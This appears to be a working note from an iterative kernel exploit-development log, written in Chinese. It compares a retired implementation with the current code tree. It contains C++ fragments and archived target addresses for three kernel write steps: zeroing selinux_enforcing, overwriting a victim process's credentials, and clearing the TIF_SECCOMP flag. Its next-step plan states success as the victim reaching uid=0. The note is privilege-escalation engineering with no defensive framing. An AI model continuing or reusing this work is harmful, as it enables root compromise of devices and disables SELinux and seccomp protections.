# 43499 · W1b 公式 + 一个更大的差异（round 120）

## W1b 的公式（退役 steps.cpp:289-307 逐字 ✓）

```cpp
const uintptr_t w1_scratch_poison = heap.current.base + mcast.buffer_size;   // 页面基址 + 0x108 ✓
WriteRequest::make(w1_scratch_poison, WriteMode::Zero, 1);                    // Zero + leaf=1 ✓
```

归档验算：W1b target=0xffffff88f5b98108 ⇒ 0xffffff88f5b98000 + 0x108 ✓（吻合 ✓）。
重试次数：`w1_scratch_repair_attempts`（文档里是 3 ✓）；成功后 `releasing quarantine` ✓。

## 更大的差异：**每一步的请求本就不同**

```
归档： === W1: SELinux ===      target=0xffffff802adaad88 mode=1 leaf=0    ← Zero + preserve（selinux_enforcing）
       === W2: cred ===         target=0xffffff898138e198 mode=2 leaf=0    ← Credential + preserve（受害者的 cred）
       === W3: TIF_SECCOMP === target=0xffffff898138da00 mode=1 leaf=1    ← Zero + leaf（task 字段）

本树： 三步（w1/w2/w3）**共用同一个请求**：mode=Credential、target = spawned.task + cred_off  ✗
```

⇒ 也就是说：本树把"三步"当成了"同一种写的三遍" ✗，而退役是**三步三种请求** ✓ ⇒ 这是当前最明显的
  结构性差异 ✓（可能比 W1b 更关键 ✓）。

## 下一步（规格，两步分开验 ✓）

1. **让请求按步变化**：`w1 → {selinux_enforcing, Zero, preserve}` ✓、`w2 → {child cred, Credential, preserve}` ✓、
   `w3 → {child_task + 0x0（TIF_SECCOMP 同址 ✓）, Zero, leaf=1}` ✓ —— 三类目标都已有来源（文档/归档 ✓）；
2. **再补各步的 `leaf=1` 修复轮**（W1b ✓；W2b 已补 ✓；W3 之后退役是否也有要看归档尾部 ✓）；
3. 判据：`main: victim uid=0` ✓；旁证：三步各自的 `status=0 clean=1/1 step=0` ✓。
